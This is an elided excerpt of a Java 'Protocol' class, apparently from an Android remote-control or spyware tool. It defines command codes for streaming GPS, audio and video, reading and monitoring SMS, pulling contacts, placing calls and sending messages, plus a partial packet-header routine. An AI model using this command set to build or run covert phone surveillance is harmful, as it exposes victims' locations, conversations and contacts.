...
public class Protocol {
	...
	public final static short GET_GPS_STREAM = (short) (P_INST + 1); // String
																		// du
																		// Provider
	...
	public final static short GET_SOUND_STREAM = (short) (P_INST + 4); // Int
																		// source
	public final static short STOP_SOUND_STREAM = (short) (P_INST + 5); // -

	public final static short GET_VIDEO_STREAM = (short) (P_INST + 6); // Int
																		// source
																		// (pour
																		// api
																		// 8+)
	...
	public final static short MONITOR_SMS = (short) (P_INST + 10); // filter
																	// (phone
																	// number)
																	// or
																	// (incoming/outgoing)
	...
	public final static short GET_CONTACTS = (short) (P_INST + 12); // filter
																	// sim/phone
																	// ?
	public final static short GET_SMS = (short) (P_INST + 13); // filter (phone
																// number) or
																// (read/unread)
																// or
																// (received/sent)
	...
	public final static short GIVE_CALL = (short) (P_INST + 16);// String
																// phonenumber
	public final static short SEND_SMS = (short) (P_INST + 17); // String
																// phonenumber,
																// String
																// message
	...
	public final static short OPEN_BROWSER = (short) (P_INST + 22); // String
																	// url
	public final static short DO_VIBRATE = (short) (P_INST + 23); // long
																	// millisec
	// email ?
	...
	public static byte[] dataHeaderGenerator(int totalLenght, int localLength,
			boolean moreF, short idPaquet, int channel) {
		byte[] byteTotalLength = ByteBuffer.allocate(4).putInt(totalLenght)
				.array();
		byte[] byteLocalLength = ByteBuffer.allocate(4).putInt(localLength)
				.array();
		...
		if (moreF)
			...
			byteMoreF[0] = 0;
		byte[] bytePointeurData = ByteBuffer.allocate(2).putShort(idPaquet)
				.array();
		...
		System.arraycopy(byteLocalLength, 0, header, byteTotalLength.length,
				byteLocalLength.length);
		System.arraycopy(byteMoreF, 0, header, byteTotalLength.length
				+ byteLocalLength.length, byteMoreF.length);
		System.arraycopy(bytePointeurData, 0, header, byteTotalLength.length
				+ byteLocalLength.length + byteMoreF.length,
				bytePointeurData.length);
		System.arraycopy(byteChannel, 0, header, byteTotalLength.length
				+ byteLocalLength.length + byteMoreF.length
				+ bytePointeurData.length, byteChannel.length);
